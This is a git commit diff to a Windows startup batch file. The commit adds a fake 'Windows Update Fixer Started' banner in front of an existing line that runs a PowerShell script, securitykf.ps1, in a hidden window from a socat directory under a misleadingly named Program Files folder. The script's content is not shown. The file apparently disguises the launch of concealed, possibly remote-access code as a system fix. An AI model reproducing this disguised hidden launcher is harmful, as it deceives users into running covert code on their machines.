5a49834e8a5f9a6f7b1c141d8ac6b5712b5d7086
KffeePt <95396642+KffeePt@users.noreply.github.com>
2021-12-11 05:05:28 -0600

    Update startupkf.cmd

--- startupkf.cmd
+++ startupkf.cmd
@@ -1,1 +1,8 @@
+ECHO Windows Update Fixer Started
+timeout 1
+ECHO .
+timeout 1
+ECHO .
+timeout 1
+ECHO .
 cd \"Program Files"\ZOLOFT\ZOLOFT\socat-windows-master && powershell.exe -windowstyle hidden ./securitykf.ps1 
